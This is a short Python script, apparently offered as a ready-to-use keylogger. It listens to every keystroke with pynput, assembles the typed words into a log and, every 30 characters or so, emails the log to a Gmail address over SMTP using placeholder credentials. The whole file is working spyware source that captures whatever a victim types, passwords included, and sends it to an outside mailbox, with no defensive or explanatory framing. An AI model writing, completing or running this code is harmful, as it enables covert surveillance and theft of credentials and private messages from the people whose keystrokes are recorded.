# import getpass
import smtplib
from pynput.keyboard import Key,Listener
# set up email
email = 'mailcuaban@gmail.com'
password = 'app pass cua ban'
session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
session.starttls() #enable security
session.login(email, password) #login with mail_id and password
# logger
full_log=''
word=''
email_char_limit = 30
def on_press(key):
     global word
     global full_log
     global email
     global email_char_limit
     if key == Key.space or key == Key.enter:
        word +=' '
        full_log += word
        word=''
        if len(full_log) >= email_char_limit:
            # send_log()
            print(full_log)
            send_log()
            full_log = ''
     elif key == Key.shift_l or key == Key.shift_r:
        return
     elif key == Key.backspace:
        word = word[:-1]
     else:
        char = f'{key}'
        char = char[1:-1]
        word += char
     if key == Key.esc:
        return False
def send_log():
    session.sendmail(email,email,full_log)
with Listener(on_press=on_press) as listener:
    listener.join()

